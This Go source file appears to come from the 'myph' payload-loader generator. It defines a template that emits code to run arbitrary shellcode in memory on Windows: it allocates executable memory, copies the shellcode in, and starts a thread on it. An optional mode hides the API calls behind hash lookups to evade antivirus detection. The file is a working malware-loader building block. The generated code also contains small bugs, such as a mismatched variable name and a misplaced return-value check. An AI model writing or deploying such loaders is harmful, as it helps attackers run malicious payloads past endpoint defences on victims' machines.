package loaders

import (
	"fmt"
	"strings"
)

type CreateTTemplate struct {
	UseApiHashing bool
	HashMethod    string
}

func (t CreateTTemplate) Import() string {
	if t.UseApiHashing {
		return fmt.Sprintf(`
import (
	"fmt"
	"log"
	"os"
	"syscall"
	"unsafe"

	"github.com/Binject/debug/pe"
	loader "github.com/cmepw/myph/internals"
)
        `)
	}

	return fmt.Sprintf(`
import (
	"syscall"
	"unsafe"
)
`)
}

func (t CreateTTemplate) Const() string {
	if !t.UseApiHashing {

		return fmt.Sprintf(`
const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32        = syscall.MustLoadDLL("kernel32.dll")
	ntdll           = syscall.MustLoadDLL("ntdll.dll")

    WaitForSingleObject = kernel32.MustFindProc("WaitForSingleObject")
	VirtualAlloc        = kernel32.MustFindProc("VirtualAlloc")
	CreateThread        = kernel32.MustFindProc("CreateThread")

    RtlCopyMemory   = ntdll.MustFindProc("RtlCopyMemory")
)
        `)

	}

	return fmt.Sprintf(`
const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)


`)
}

func (t CreateTTemplate) Init() string {
	return fmt.Sprintf("\n")
}

func (t CreateTTemplate) Process() string {
	if t.UseApiHashing {

		return fmt.Sprintf(`
    ntdll, err := pe.Open("C:\\Windows\\System32\\ntdll.dll"); if err != nil {
        fmt.Println(err.Error())
        os.Exit(1)
    }
    defer ntdll.Close()


    kernel32, err := pe.Open("C:\\Windows\\System32\\kernel32.dll"); if err != nil {
        fmt.Println(err.Error())
        os.Exit(1)
    }
    defer kernel32.Close()


    var addr uintptr
	regionsize := uintptr(len(shellcode))
    VirtualAlloc, err := loader.LoadFunctionFromHash(loader.HashDJB2, "32b0ac787d4dba31", kernel32)
	if err != nil {
		log.Fatal(err)
	}

    addr = loader.HashedCall(
        VirtualAlloc,
        0,
        regionSize,
        MEM_COMMIT|MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    )

    if addr == 0 {
        log.Fatal("Error: null return value")
    }

    RtlCopyMemory, err := loader.LoadFunctionFromHash(loader.HashDJB2, "7a4c2ed807c8fcf1", ntdll)
    if err != nil {
		log.Fatal(err)
	}

    rvalue := loader.HashedCall(
        RtlCopyMemory,
        addr,
        (uintptr)(unsafe.Pointer(&shellcode[0])),
        regionsize,
    ); if addr != 0 {
        log.Fatal("Error: invalid return value")
    }

    CreateThread, err := loader.LoadFunctionFromHash(loader.HashDJB2, "65dd5ebc0ad0132a", kernel32)
    if err != nil {
		log.Fatal(err)
	}

    threadAddr := loader.HashedCall(
        CreateThread,
        0,
		0,
		addr,
		0,
		0,
		0,
    )

    WaitForSingleObject, err := loader.LoadFunctionFromHash(loader.HashDJB2, "aabf4c35522cfc3e", kernel32)
    if err != nil {
		log.Fatal(err)
    }


    loader.HashedCall(
        WaitForSingleObject,
        threadAddr,
        0xFFFFFFFF,
    )

        `)

	}

	return fmt.Sprintf(`
	addr, _, _ := VirtualAlloc.Call(
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE,
	)

	_, _, _ = RtlCopyMemory.Call(
		addr,
		(uintptr)(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
	)

    threadAddr, _, _ := CreateThread.Call(
		0,
		0,
		addr,
		0,
		0,
		0,
	)

    WaitForSingleObject.Call(
        threadAddr,
        0xFFFFFFFF,
    )
`)
}

func (t CreateTTemplate) GetTemplate(targetProcess string) string {
	InformProcessUnused(targetProcess)

	var template = `
package main

__IMPORT__STATEMENT__

__CONST__STATEMENT__

func ExecuteOrderSixtySix(shellcode []byte) {

__IMPORT__INIT__

__IMPORT__PROCESS__

}
    `
	template = strings.Replace(template, "__IMPORT__STATEMENT__", t.Import(), -1)
	template = strings.Replace(template, "__CONST__STATEMENT__", t.Const(), -1)
	template = strings.Replace(template, "__IMPORT__INIT__", t.Init(), -1)
	template = strings.Replace(template, "__IMPORT__PROCESS__", t.Process(), -1)

	return strings.Replace(template, "__PROCESS__", targetProcess, -1)
}
